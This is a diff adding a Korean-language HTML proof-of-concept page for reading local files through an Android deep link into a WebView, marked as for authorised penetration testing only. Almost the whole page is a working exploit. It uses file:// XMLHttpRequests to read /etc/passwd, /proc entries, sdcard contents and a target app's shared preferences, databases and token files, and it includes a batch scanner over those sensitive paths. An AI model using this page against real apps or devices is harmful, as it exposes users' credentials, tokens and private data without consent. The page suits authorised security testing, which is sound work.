@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DeepLink File Read PoC</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+  h2 { color: #58a6ff; margin-bottom: 12px; font-size: 15px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+  .file-btn { background: #21262d; border: 1px solid #30363d; color: #8b949e; padding: 5px 10px; border-radius: 5px; font-size: 11px; cursor: pointer; font-family: monospace; margin: 3px; }
+  .file-btn:hover { background: #30363d; color: #c9d1d9; }
+  .file-btn.active { background: #1f6feb33; border-color: #58a6ff; color: #58a6ff; }
+  input[type=text] { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 5px; color: #c9d1d9; padding: 8px; font-family: monospace; font-size: 12px; margin-bottom: 10px; }
+  input[type=text]:focus { outline: none; border-color: #58a6ff; }
+  .btn { background: #238636; border: none; color: #fff; padding: 7px 16px; border-radius: 5px; cursor: pointer; font-size: 13px; font-family: monospace; margin-right: 6px; }
+  .btn:hover { background: #2ea043; }
+  .btn.red { background: #da3633; }
+  .btn.red:hover { background: #f85149; }
+  #result, #scan-log { background: #0d1117; border: 1px solid #30363d; border-radius: 5px; padding: 12px; font-size: 12px; min-height: 100px; white-space: pre-wrap; word-break: break-all; max-height: 350px; overflow-y: auto; }
+  #scan-log { font-size: 11px; max-height: 250px; }
+  .ok { color: #3fb950; } .err { color: #f85149; } .info { color: #58a6ff; } .hit { color: #f0883e; font-weight: bold; } .dim { color: #6e7681; }
+  .meta { color: #8b949e; font-size: 11px; margin-bottom: 8px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>DeepLink &rarr; WebView File Read PoC</h2>
+  <p class="meta">모의해킹 전용 &mdash; 허가된 환경에서만 사용</p>
+</div>
+
+<div class="card">
+  <h2>단일 파일 읽기</h2>
+  <div>
+    <button class="file-btn" onclick="setPath(this,'file:///etc/hosts')">etc/hosts</button>
+    <button class="file-btn" onclick="setPath(this,'file:///etc/passwd')">etc/passwd</button>
+    <button class="file-btn" onclick="setPath(this,'file:///proc/version')">proc/version</button>
+    <button class="file-btn" onclick="setPath(this,'file:///proc/net/arp')">proc/net/arp</button>
+    <button class="file-btn" onclick="setPath(this,'file:///proc/net/route')">proc/net/route</button>
+    <button class="file-btn" onclick="setPath(this,'file:///proc/self/cmdline')">proc/self/cmdline</button>
+    <button class="file-btn" onclick="setPath(this,'file:///sdcard/')">sdcard/</button>
+    <button class="file-btn" onclick="setPath(this,'file:///sdcard/Download/')">sdcard/Download</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/local/tmp/')">data/local/tmp</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/local/tmp/flag.txt')">flag.txt</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/data/TARGET_PKG/shared_prefs/user.xml')">shared_prefs/user.xml</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/data/TARGET_PKG/databases/app.db')">databases/app.db</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/data/TARGET_PKG/files/token.txt')">files/token.txt</button>
+    <button class="file-btn" onclick="setPath(this,'file:///data/data/TARGET_PKG/cache/')">cache/</button>
+  </div><br>
+  <input id="custom-path" type="text" value="file:///etc/hosts" placeholder="file:///path/to/target" />
+  <div>
+    <button class="btn" onclick="readFile()">&#9654; 읽기</button>
+    <button class="btn red" onclick="clearResult()">초기화</button>
+  </div><br>
+  <div id="result"><span class="info">경로 선택 후 읽기 버튼 클릭</span></div>
+</div>
+
+<div class="card">
+  <h2>민감 파일 일괄 스캔</h2>
+  <p class="meta">TARGET_PKG를 실제 패키지명으로 교체 후 사용</p>
+  <input id="pkg-name" type="text" value="TARGET_PKG" placeholder="com.target.app" />
+  <div>
+    <button class="btn" onclick="batchScan()">&#9654; 스캔 시작</button>
+    <button class="btn red" onclick="clearScan()">초기화</button>
+  </div><br>
+  <div id="scan-log">스캔 대기 중...</div>
+</div>
+
+<script>
+function setPath(btn, p) {
+  document.getElementById('custom-path').value = p;
+  document.querySelectorAll('.file-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+function esc(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function readFile() {
+  const path = document.getElementById('custom-path').value.trim();
+  const el = document.getElementById('result');
+  if (!path) { el.innerHTML = '<span class="err">경로를 입력하세요</span>'; return; }
+  el.innerHTML = '<span class="info">요청 중: ' + esc(path) + '</span>';
+  try {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', path, false);
+    xhr.send(null);
+    if (xhr.responseText && xhr.responseText.length > 0) {
+      el.innerHTML = '<span class="ok">[HIT] ' + esc(path) + '</span>\n<span class="meta">크기: ' + xhr.responseText.length + ' bytes</span>\n<span class="meta">──────────────────────</span>\n\n' + esc(xhr.responseText);
+    } else {
+      el.innerHTML = '<span class="err">[EMPTY] 응답 없음</span>\n<span class="dim">파일 없거나 비어있음</span>';
+    }
+  } catch(e) {
+    el.innerHTML = '<span class="err">[BLOCKED] ' + esc(e.message) + '</span>\n\n<span class="info">가능한 원인:</span>\n<span class="dim"> - allowUniversalAccessFromFileURLs = false\n - allowFileAccess = false\n - 파일 경로 없음</span>';
+  }
+}
+
+function clearResult() { document.getElementById('result').innerHTML = '<span class="info">초기화됨</span>'; }
+
+function batchScan() {
+  const pkg = document.getElementById('pkg-name').value.trim() || 'TARGET_PKG';
+  const el = document.getElementById('scan-log');
+  const targets = [
+    'file:///etc/hosts','file:///etc/passwd','file:///proc/version',
+    'file:///proc/net/arp','file:///proc/net/route','file:///proc/self/cmdline',
+    'file:///sdcard/','file:///sdcard/Download/','file:///data/local/tmp/',
+    'file:///data/data/'+pkg+'/shared_prefs/',
+    'file:///data/data/'+pkg+'/shared_prefs/user.xml',
+    'file:///data/data/'+pkg+'/databases/',
+    'file:///data/data/'+pkg+'/files/',
+    'file:///data/data/'+pkg+'/files/token.txt',
+    'file:///data/data/'+pkg+'/cache/'
+  ];
+  el.innerHTML = '<span class="info">스캔 시작 (패키지: ' + esc(pkg) + ')</span>\n\n';
+  let i = 0;
+  function next() {
+    if (i >= targets.length) { el.innerHTML += '\n<span class="ok">──── 스캔 완료 ────</span>'; return; }
+    const p = targets[i++];
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', p, false);
+      xhr.send(null);
+      if (xhr.responseText && xhr.responseText.length > 0)
+        el.innerHTML += '<span class="hit">[HIT] ' + esc(p) + ' (' + xhr.responseText.length + ' bytes)</span>\n';
+      else
+        el.innerHTML += '<span class="dim">[ -- ] ' + esc(p) + '</span>\n';
+    } catch(e) {
+      el.innerHTML += '<span class="dim">[ERR] ' + esc(p) + '</span>\n';
+    }
+    el.scrollTop = el.scrollHeight;
+    setTimeout(next, 60);
+  }
+  next();
+}
+
+function clearScan() { document.getElementById('scan-log').innerHTML = '스캔 대기 중...'; }
+</script>
+</body>
+</html>
